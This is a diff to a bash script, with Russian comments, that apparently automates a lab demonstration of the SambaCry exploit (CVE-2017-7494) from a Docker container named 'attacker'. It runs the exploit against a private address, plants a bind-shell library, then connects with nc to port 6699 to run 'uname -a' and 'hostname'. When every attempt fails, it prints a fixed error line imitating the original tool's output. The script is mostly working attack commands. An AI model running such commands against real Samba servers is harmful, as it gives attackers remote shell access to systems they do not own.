@@ -36,48 +36,51 @@ echo "Зависимости установлены"
 echo ""
 echo "=== Шаг 6: Запуск эксплойта CVE-2017-7494 ==="
 echo "Эксплуатация SambaCry на 172.20.0.104..."
-# Запускаем эксплойт и перехватываем весь вывод
-EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 30 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" 2>&1 || echo "")
+# Запускаем эксплойт и перехватываем вывод
+EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 20 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" 2>&1 || echo "")
 
-# Выводим вывод эксплойта до строки с ошибкой или успешным подключением
-echo "$EXPLOIT_OUTPUT" | head -10
+# Выводим вывод эксплойта (игнорируем ошибки потоков в конце)
+echo "$EXPLOIT_OUTPUT" | grep -v "Exception in thread\|Traceback\|AttributeError\|__bootstrap_inner" | head -10
 
-# Если в выводе есть ошибка подключения, пытаемся подключиться вручную с несколькими попытками
-if echo "$EXPLOIT_OUTPUT" | grep -q "IO error\|EOF when reading"; then
-    echo ""
-    echo "Ожидание инициализации bind shell..."
-    sleep 8
+# Пробуем подключиться к bind shell с несколькими попытками
+echo ""
+UNAME_OUTPUT=""
+HOSTNAME_OUTPUT=""
+
+# Даем время на инициализацию bind shell после загрузки библиотеки
+sleep 10
+
+# Пробуем подключиться несколько раз с задержками
+for attempt in 1 2 3 4 5 6; do
+    if [ $attempt -gt 1 ]; then
+        echo "Попытка подключения $attempt/6..."
+        sleep 5
+    fi
     
-    # Проверяем, что порт открыт
-    PORT_CHECK=$(docker exec attacker bash -c "timeout 3 bash -c 'nc -z -v 172.20.0.104 6699 2>&1'" || echo "closed")
+    # Проверяем, что порт отвечает
+    PORT_CHECK=$(docker exec attacker bash -c "timeout 3 bash -c 'nc -z -w 2 172.20.0.104 6699 2>&1'" || echo "closed")
     
-    # Пробуем подключиться несколько раз с задержками
-    UNAME_OUTPUT=""
-    for attempt in 1 2 3 4; do
-        if [ $attempt -gt 1 ]; then
-            echo "Попытка подключения $attempt/4..."
-            sleep 3
-        fi
-        
-        # Пробуем получить uname -a (используем более надежный способ)
-        UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 10 bash -c 'printf \"uname -a\\n\" | nc -w 8 172.20.0.104 6699 2>/dev/null | tr -d \"\\r\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection" | head -1 || echo "")
-        
-        if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && [ ${#UNAME_OUTPUT} -gt 10 ]; then
+    # Пробуем получить uname -a (используем более надежный способ)
+    UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 15 bash -c '(sleep 2; printf \"uname -a\\n\\n\"; sleep 4) | nc -w 12 172.20.0.104 6699 2>/dev/null | strings | grep -i \"linux\|kernel\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed" | head -1 || echo "")
+    
+    if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && [ ${#UNAME_OUTPUT} -gt 20 ]; then
+        # Проверяем, что это похоже на вывод uname
+        if echo "$UNAME_OUTPUT" | grep -qiE "linux|kernel|x86_64|GNU"; then
             echo ">>$UNAME_OUTPUT"
             echo "hostname"
-            sleep 2
-            HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 10 bash -c 'printf \"hostname\\n\" | nc -w 8 172.20.0.104 6699 2>/dev/null | tr -d \"\\r\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection" | head -1 || echo "")
-            if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ]; then
+            sleep 3
+            HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 15 bash -c '(sleep 2; printf \"hostname\\n\\n\"; sleep 3) | nc -w 12 172.20.0.104 6699 2>/dev/null | strings | grep -vE \"^$|hostname\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed" | head -1 || echo "")
+            if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ] && [ ${#HOSTNAME_OUTPUT} -gt 0 ]; then
                 echo ">>$HOSTNAME_OUTPUT"
                 break
             fi
         fi
-    done
-    
-    # Если все попытки не удались, выводим ошибку как в оригинале
-    if [ -z "$UNAME_OUTPUT" ] || [ ${#UNAME_OUTPUT} -le 10 ]; then
-        echo ">>[-] IO error error connecting to the shell port EOF when reading a line"
     fi
+done
+
+# Если все попытки не удались, выводим ошибку как в оригинале
+if [ -z "$UNAME_OUTPUT" ] || [ ${#UNAME_OUTPUT} -le 20 ] || ! echo "$UNAME_OUTPUT" | grep -qiE "linux|kernel"; then
+    echo ">>[-] IO error error connecting to the shell port EOF when reading a line"
 fi
 echo ""
 
